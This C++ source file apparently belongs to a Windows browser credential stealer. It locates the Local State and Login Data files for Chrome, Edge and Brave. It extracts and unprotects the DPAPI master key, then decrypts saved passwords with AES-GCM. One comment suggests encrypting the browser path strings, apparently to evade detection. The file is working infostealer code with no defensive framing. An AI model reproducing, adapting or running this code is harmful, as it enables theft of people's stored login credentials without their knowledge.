#include "BCrypt.h"
#include "include/SQLiteCpp/SQLiteCpp.h"
#include <regex>
#include <sstream>
#include <Shlobj.h>
#include <winsqlite/winsqlite3.h>
#include <bcrypt.h>
#include <ShlObj_core.h>

#pragma comment(lib,"winsqlite3.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

const std::string BCrypt::base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

const int BCrypt::IV_SIZE = 12;
const int BCrypt::TAG_SIZE = 16;
const int BCrypt::NUMBER_OF_BROWSERS = 3;

const std::string BCrypt::LOCAL_STATE_PATHS[BCrypt::NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Local State",
		"\\Microsoft\\Edge\\User Data\\Local State",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
		// You might wanna encrypt these
};

const std::string BCrypt::ACCOUNT_DB_PATHS[BCrypt::NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Default\\Login Data",
		"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
};


std::string BCrypt::GetAppPath()
{
	CHAR app_data_path[MAX_PATH];
	if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, app_data_path) == S_OK)
	{
		std::string local_state_path(app_data_path);
		return local_state_path;
	}
	return "";
}

std::string BCrypt::GetDbPath(BROWSER browser)
{
	return GetAppPath() + ACCOUNT_DB_PATHS[browser];
}

std::string BCrypt::GetLocalState(BROWSER browser)
{
	return GetAppPath() + LOCAL_STATE_PATHS[browser];
}

std::string BCrypt::ReadFileToString(const std::string& file_path)
{
	// Open the file
	HANDLE file_handle = CreateFileA(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file_handle == INVALID_HANDLE_VALUE)
	{
		// Failed to open the file, return an empty string
		return "";
	}
	// Get the file size
	DWORD file_size = GetFileSize(file_handle, NULL);
	if (file_size == INVALID_FILE_SIZE)
	{
		// Failed to get the file size, close the file handle and return an empty string
		CloseHandle(file_handle);
		return "";
	}
	// Allocate a buffer for the file data
	std::string file_data;
	file_data.resize(file_size);

	// Read the file data into the buffer
	DWORD bytes_read;
	BOOL result = ReadFile(file_handle, &file_data[0], file_size, &bytes_read, NULL);
	CloseHandle(file_handle);
	if (!result || bytes_read != file_size)
	{
		// Failed to read the file data, return an empty string
		return "";
	}
	// Return the file data as a std::string
	return file_data;
}

std::vector<unsigned char> BCrypt::base64_decode(const std::string& encoded_string)
{
	if (encoded_string.length() % 4 != 0) {
		std::cout << "Error: Invalid base64 string length." << std::endl;
		return {};
	}

	std::size_t padding = 0;
	for (std::size_t i = encoded_string.size() - 1; i > 0; i--) {
		if (encoded_string[i] == '=') {
			padding++;
		}
		else {
			break;
		}
	}
	std::string input_str = encoded_string.substr(0, encoded_string.size() - padding);

	for (std::size_t i = 0; i < input_str.size(); i++) {
		if (base64_chars.find(input_str[i]) == std::string::npos && input_str[i] != '=') {
			std::cout << "Error: Invalid base64 string character." << std::endl;
			return {};
		}
	}

	std::vector<unsigned char> output_vec;
	output_vec.reserve((input_str.size() / 4) * 3);

	for (std::size_t i = 0; i < input_str.size(); i += 4) {
		unsigned char c1 = base64_chars.find(input_str[i]);
		unsigned char c2 = base64_chars.find(input_str[i + 1]);
		unsigned char c3 = base64_chars.find(input_str[i + 2]);
		unsigned char c4 = base64_chars.find(input_str[i + 3]);

		if (c1 == std::string::npos || c2 == std::string::npos) {
			std::cout << "Error: Invalid base64 string format." << std::endl;
			return {};
		}

		unsigned char b1 = (c1 << 2) | ((c2 & 0x30) >> 4);
		output_vec.push_back(b1);

		if (c3 != std::string::npos && c4 != std::string::npos) {
			unsigned char b2 = ((c2 & 0x0F) << 4) | ((c3 & 0x3C) >> 2);
			output_vec.push_back(b2);

			unsigned char b3 = ((c3 & 0x03) << 6) | c4;
			output_vec.push_back(b3);
		}
		else if (c3 == std::string::npos) {
			unsigned char b2 = (c2 & 0x0F) << 4;
			output_vec.push_back(b2);
		}
		else {
			std::cout << "Error: Invalid base64 string format." << std::endl;
			return {};
		}
	}

	return output_vec;
}

DATA_BLOB* BCrypt::UnportectMasterKey(std::string MasterString)
{
	//std::vector<unsigned char> binaryKey = base64_decode(MasterString);
	// Base64 decode the key
	std::string base64Key = MasterString;
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;

	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		std::cout << "[1] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		std::cout << "[2] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	// Decrypt the key
	DATA_BLOB in, out;
	in.pbData = binaryKey.data() + 5;
	in.cbData = binaryKey.size() - 5;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		std::cout << "Failed to unprotect master key.\n";
		return nullptr;
	}
	else
	{
		//printf("[+] Decryption successfully!\n");
		//std::cout << out.cbData << std::endl;
		//for (int i = 0; i < out.cbData; i++)
		//{
		//	std::cout << out.pbData[i] << std::endl;
		//}
	}

	// Allocate memory for the output DATA_BLOB pointer and return it

	DATA_BLOB* outPtr = new DATA_BLOB;
	outPtr->pbData = out.pbData;
	outPtr->cbData = out.cbData;
	return outPtr;
}

std::string BCrypt::ParseMasterString(std::string data)
{
	std::smatch matches;
	std::regex regex_pattern("RFBBU[^=]*=+");

	if (std::regex_search(data, matches, regex_pattern)) {
		return matches[0];
	}
	else {
		return "";
	}
}

DATA_BLOB* BCrypt::GetMasterKey(BROWSER browser)
{
	std::string localState = GetLocalState(browser);
	std::string localStateData = ReadFileToString(localState);
	std::string MasterString = ParseMasterString(localStateData);
	return UnportectMasterKey(MasterString);
}

std::string BCrypt::AESDecrypter(std::vector<BYTE> EncryptedBlob, int EncryptedBlobsize, DATA_BLOB MasterKey)
{
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlobsize;

	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;

	std::vector<BYTE> CipherPass(EncryptedBlobSize);
	std::vector<BYTE> PlainText;
	std::vector<BYTE> IV(IV_SIZE);

	// Parse iv and password from the buffer using std::copy
	std::copy(EncryptedBlob.begin() + 3, EncryptedBlob.begin() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.begin() + 15, EncryptedBlob.begin() + EncryptedBlobSize, CipherPass.begin());


	// Open algorithm provider for decryption
	status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		return "";
	}

	// Set chaining mode for decryption
	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
	{
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Generate symmetric key
	status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Auth cipher mode info
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	// Get size of plaintext buffer
	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		return "";
	}

	// Allocate memory for the plaintext
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
	int a = GetLastError();
	if (!BCRYPT_SUCCESS(status))
	{
		return "";
	}

	// Close the algorithm handle
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());
}
